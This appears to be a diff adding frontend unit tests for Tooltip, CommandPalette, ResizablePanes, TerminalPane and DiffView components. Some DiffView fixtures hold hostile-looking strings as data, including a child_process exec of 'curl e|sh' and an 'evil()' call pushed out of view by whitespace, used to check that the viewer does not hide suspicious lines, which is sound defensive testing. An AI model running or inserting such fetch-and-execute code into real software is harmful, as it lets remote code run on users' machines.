@@ -81,6 +81,26 @@ describe("Tooltip", () => {
   });
 });
 
+describe("Tooltip keeps what the child already points at", () => {
+  it("merges aria-describedby and lets Esc close only the tooltip", () => {
+    vi.useFakeTimers();
+    render(<Tooltip text="Why"><input aria-label="Name" aria-describedby="err" /></Tooltip>);
+    const i = screen.getByLabelText("Name");
+    expect(i.getAttribute("aria-describedby")).toBe("err");
+    fireEvent.focus(i);
+    act(() => { vi.advanceTimersByTime(400); });
+    const ids = i.getAttribute("aria-describedby")!.split(" ");
+    expect(ids[0]).toBe("err");
+    expect(ids).toHaveLength(2);
+    const outer = vi.fn();
+    document.addEventListener("keydown", outer);
+    fireEvent.keyDown(i, { key: "Escape" });
+    document.removeEventListener("keydown", outer);
+    expect(outer).not.toHaveBeenCalled();
+    expect(i.getAttribute("aria-describedby")).toBe("err");
+  });
+});
+
 describe("CommandPalette", () => {
   const mk = () => [{ id: "stop", label: "Stop worker", run: vi.fn() }, { id: "start", label: "Start run", run: vi.fn() }, { id: "open", label: "Open settings", hint: "Cmd ,", run: vi.fn() }];
   it("scores fuzzy matches in order and rejects non-matches", () => {
@@ -106,6 +126,16 @@ describe("CommandPalette", () => {
     const ran = cmds.filter((c) => c.run.mock.calls.length);
     expect(ran).toHaveLength(1);
   });
+  it("does not run a command on Enter while an IME is composing, and announces the result count", () => {
+    const cmds = mk();
+    render(<CommandPalette open onClose={() => {}} commands={cmds} />);
+    const box = screen.getByRole("combobox", { hidden: true });
+    expect(screen.getByRole("status", { hidden: true }).textContent).toBe("3 commands");
+    fireEvent.keyDown(box, { key: "Enter", isComposing: true });
+    expect(cmds.some((c) => c.run.mock.calls.length)).toBe(false);
+    expect(box.getAttribute("aria-autocomplete")).toBe("list");
+    expect(screen.getByRole("listbox", { hidden: true }).querySelector("p")).toBeNull();
+  });
   it("says so when nothing matches", () => {
     render(<CommandPalette open onClose={() => {}} commands={mk()} />);
     fireEvent.change(screen.getByRole("combobox", { hidden: true }), { target: { value: "qqq" } });
@@ -126,6 +156,17 @@ describe("ResizablePanes", () => {
     fireEvent.keyDown(h, { key: "Home" });
     fireEvent.keyDown(h, { key: "ArrowLeft" });
     expect(h.getAttribute("aria-valuenow")).toBe("100");
+  });
+  it("a cancelled pointer ends the drag, and text selection is off only while dragging", () => {
+    const { container } = render(<ResizablePanes initial={200} min={100} max={260} label="Resize" first="a" second="b" />);
+    const h = screen.getByRole("separator");
+    const ptr = (type: string, clientX: number) => fireEvent(h, new MouseEvent(type, { clientX, bubbles: true }));
+    ptr("pointerdown", 200);
+    expect(container.querySelector(".v-panes--dragging")).toBeTruthy();
+    ptr("pointercancel", 200);
+    expect(container.querySelector(".v-panes--dragging")).toBeNull();
+    ptr("pointermove", 250);
+    expect(h.getAttribute("aria-valuenow")).toBe("200");
   });
   it("drags with the pointer and clamps", () => {
     render(<ResizablePanes initial={200} min={100} max={260} label="Resize" first="a" second="b" />);
@@ -159,6 +200,13 @@ describe("TerminalPane", () => {
     const rows = container.querySelectorAll(".v-vrow").length;
     expect(rows).toBeGreaterThan(0);
     expect(rows).toBeLessThan(60);
+  });
+  it("sanitizes only the visible rows: 100,000 long lines render and update quickly", () => {
+    const lines = Array.from({ length: 100000 }, (_, i) => `${E}[32m${"x".repeat(200)}${E}[0m ${i}`);
+    const t = Date.now();
+    const { rerender } = render(<TerminalPane lines={lines} height={360} />);
+    rerender(<TerminalPane lines={[...lines, "one more"]} height={360} />);
+    expect(Date.now() - t).toBeLessThan(1500);
   });
   it("follows the end of a live log", () => {
     const lines = Array.from({ length: 1000 }, (_, i) => `line ${i}`);
@@ -254,6 +302,26 @@ describe("DiffView", () => {
     expect(lines).toContain("removed: -old line");
     fireEvent.click(screen.getByRole("option", { name: /b\\u202e\.txt/ }));
     expect(screen.getByRole("region", { name: "Diff of b\\u202e.txt" })).toBeTruthy();
+  });
+  it("never hides an added or removed line that looks like a file header (threat review)", () => {
+    const d = ["diff --git a/x.js b/x.js", "--- a/x.js", "+++ b/x.js", "@@ -1 +1,2 @@", "+++ x, require('child_process').exec('curl e|sh')", "--- a SQL comment", " ctx"].join("\n");
+    const [f] = parseDiff(d);
+    expect([f.added, f.removed]).toEqual([1, 1]);
+    expect(f.lines.map((l) => l.text)).toEqual(["@@ -1 +1,2 @@", "++ x, require('child_process').exec('curl e|sh')", "-- a SQL comment", "ctx"]);
+  });
+  it("does not merge or lose files with quoted or unreadable names", () => {
+    const quoted = 'diff --git "a/\\303\\251vil.sh" "b/\\303\\251vil.sh"';
+    const d = ["diff --git a/ok.ts b/ok.ts", "@@ -0,0 +1 @@", "+fine", quoted, "@@ -0,0 +1 @@", "+payload", "diff --cc weird", "@@ -0,0 +1 @@", "+third"].join("\n");
+    const f = parseDiff(d);
+    expect(f.map((x) => [x.path, x.added])).toEqual([["ok.ts", 1], ["évil.sh", 1], ["(unnamed file)", 1]]);
+    cleanup();
+    render(<DiffView diff={[quoted, "@@ -0,0 +1 @@", "+payload"].join("\n")} />);
+    expect(screen.queryByText("No changes against the base.")).toBeNull();
+  });
+  it("marks a line that was cut instead of dropping the rest silently", () => {
+    const { container } = render(<DiffView diff={["diff --git a/a b/a", "@@ -0,0 +1 @@", "+ok();" + " ".repeat(9000) + "evil()"].join("\n")} />);
+    expect(container.textContent).toContain("[line cut]");
+    expect(container.textContent).not.toContain("evil()");
   });
   it("is honest when there is nothing to show", () => {
     render(<DiffView diff="" />);
